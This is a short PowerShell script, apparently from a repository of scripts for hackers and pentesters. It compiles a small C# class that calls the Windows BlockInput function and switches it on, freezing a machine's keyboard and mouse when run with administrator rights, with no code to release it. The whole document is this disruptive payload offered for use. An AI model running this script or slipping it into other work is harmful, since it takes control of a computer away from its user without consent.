# Only Works if the console has admin
# For more scripts visit https://github.com/Whitecat18/Powershell-Scripts-for-Hackers-and-Pentesters

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class InputBlocker
{
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
}

"@

[InputBlocker]::BlockInput($true)
